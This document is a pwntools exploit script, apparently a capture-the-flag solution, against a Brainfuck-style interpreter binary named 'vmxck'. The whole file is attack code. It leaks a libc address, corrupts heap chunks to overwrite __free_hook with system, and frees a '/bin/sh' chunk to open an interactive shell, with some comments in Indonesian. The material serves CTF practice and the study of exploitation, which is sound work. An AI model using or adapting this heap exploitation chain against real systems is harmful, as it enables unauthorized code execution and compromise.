#!/usr/bin/env python
from pwn import *

context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][1]

BINARY = './vmxck'
HOST = 'localhost'
PORT = 1234

def create(bf):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(bf))

def run(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))
    return r.recvuntil('1. ', 1)

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))

def get_min(c):
    if (0x100 - c) < c:
        payload = '-' * (0x100 - c) + '>'
    else:
        payload = '+' * c + '>'
    return payload

def exploit(REMOTE):
    # if not REMOTE: gdb.attach(r, 'brva 0x1095')

    payload  = '<<<<<<<<'
    payload += '+' * (0xc0-0x60)
    payload += '>++'
    create(payload)

    create('+++')

    run(0)

    delete(0)

    payload  = '.>' * 8
    create(payload)
    libc.address = (u64(run(0)) - libc.sym['__malloc_hook']) & 0xFFFFFFFFFFFFF000
    info('libc 0x%x' % (libc.address))

    create('/bin/sh\x00') # 2

    payload  = '[>---]'
    payload += '<+++' * 8 # perbaiki cell src, hancur sebelumnya karena [>---]
    payload += '<[-]' * 8 # kosongin cell dest
    payload += '>' * 8 # balik ke cell src
    payload += '[-<<<<<<<<+>>>>>>>>]>' * 8 # copy value dari src ke dest cells
    create(payload)

    payload  = p64(libc.sym['__free_hook'])
    payload += p64(libc.sym['__free_hook'])
    payload += p8(3)
    create(payload) # 4

    delete(4)
    run(3)

    # p = process(['java', 'Shortbf', p64(libc.sym['system'])[:6]])
    # payload = p.recvline(False)
    # p.close()

    payload  = get_min((libc.sym['system'] >>  0) & 0xff)
    payload += get_min((libc.sym['system'] >>  8) & 0xff)
    payload += get_min((libc.sym['system'] >> 16) & 0xff)
    payload += get_min((libc.sym['system'] >> 24) & 0xff)
    payload += get_min((libc.sym['system'] >> 32) & 0xff)
    payload += get_min((libc.sym['system'] >> 40) & 0xff)

    if not REMOTE: gdb.attach(r, 'brva 0x104e')
    create(payload)
    run(4)

    delete(2)

if __name__ == '__main__':
    REMOTE = len(sys.argv) > 1
    elf = ELF(BINARY, checksec=False)

    if REMOTE:
        r = remote(HOST, PORT)
        # libc = ELF('./libc.so', checksec=False)
    else:
        r = elf.process(aslr=False)
        libc = ELF('/opt/glibc/x64/2.27/lib/libc-2.27.so', checksec=False)
        info(r.pid)

    exploit(REMOTE)
    r.interactive()
